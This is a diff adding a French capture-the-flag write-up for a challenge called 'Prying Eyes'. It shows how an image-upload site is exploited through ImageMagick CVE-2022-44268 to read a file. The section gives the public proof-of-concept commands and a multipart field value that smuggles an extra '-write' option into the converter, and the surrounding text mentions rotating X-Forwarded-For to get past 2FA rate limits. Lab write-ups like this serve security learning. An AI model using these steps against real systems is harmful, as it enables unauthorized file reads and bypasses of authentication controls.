@@ -533,3 +533,74 @@ La dernière étape est de contourner le 2FA. Dans la configuration du HAProxy o
 Il suffit donc de changer le header "X-Forwarded-For" toutes les 20 requêtes.
 
 Pour ne plus répéter les étapes, j'ai fait un script Python pour automatiser tout le challenge. Voir No-Treshold.py
+
+## Prying Eyes
+
+On a la possibilité de s'enregistrer, se connecter et envoyer des posts contenant des images.
+
+L'upload semble être limité aux images, et renvoie une erreur de processing si on met autre chose ou une image atypique.
+
+Les images peuvent être retrouvées sur ce type d'URL : 
+http://83.136.249.57:57219/uploads/5bbab0f95a849c92ff88525d1bb3e288
+
+Le bloc de code responsable de la validation de l'image se trouve dans le fichier **forum.js** : 
+
+    if (req.files && req.files.image) {
+      const fileName = randomBytes(16).toString("hex");
+      const filePath = path.join(__dirname, "..", "uploads", fileName);
+
+      try {
+        const processedImage = await convert({
+          ...convertParams,
+          srcData: req.files.image.data,
+          format: "AVIF",
+        });
+
+        await fs.writeFile(filePath, processedImage);
+
+        attachedImage = `/uploads/${fileName}`;
+      } catch (error) {
+        req.flashError("There was an issue processing your image, please try again.");
+        console.error("Error occured while processing image:", error);
+        return res.redirect("/forum");
+      }
+    }
+
+On peut en déduire que le site utilise Imagick (grâce à "convert", "convertParams" et aux paramètres passés en POST notamment) : 
+https://www.npmjs.com/package/imagemagick-convert
+
+
+Un CVE permettant de la lecture de fichiers existe : 
+
+https://github.com/voidz0r/CVE-2022-44268
+
+PoC : 
+
+https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2022-44268/poc.py
+
+Utilisation : 
+
+    python3 poc.py generate -o poc.png -r flag.txt
+    
+    # Upload du fichier poc.png sur le site
+    # [...]
+    # Téléchargement de l'image obtenue après le processing
+    
+    python3 poc.py parse -i output.png
+
+
+Injection à ajouter dans le formulaire multipart pour éviter d'écrire en AVIF : 
+
+    -----------------------------152153887325622006143566307200
+    Content-Disposition: form-data; name="background"
+
+    blue -write ./uploads/output.png
+
+On obtient un résultat contenant la ligne suivante après l'exécution de la deuxième commande du PoC : 
+
+    2024-03-12 13:48:36,822 - INFO - chunk tEXt found, value = b'Raw profile type txt\x00\ntxt\n      36\n4854427b496d3467336d346731636b5f7655316e355f357452316b335f346734696e7d0a\n'
+
+En convertissant cette valeur 48544...e7d0a (Hexadécimal => ASCII) on obtient bien le flag.
+
+
+Bien aller chercher l'image sur le chemin /uploads/output.png puisque le site ne l'affichera pas, à causes des erreurs qu'elle contient.
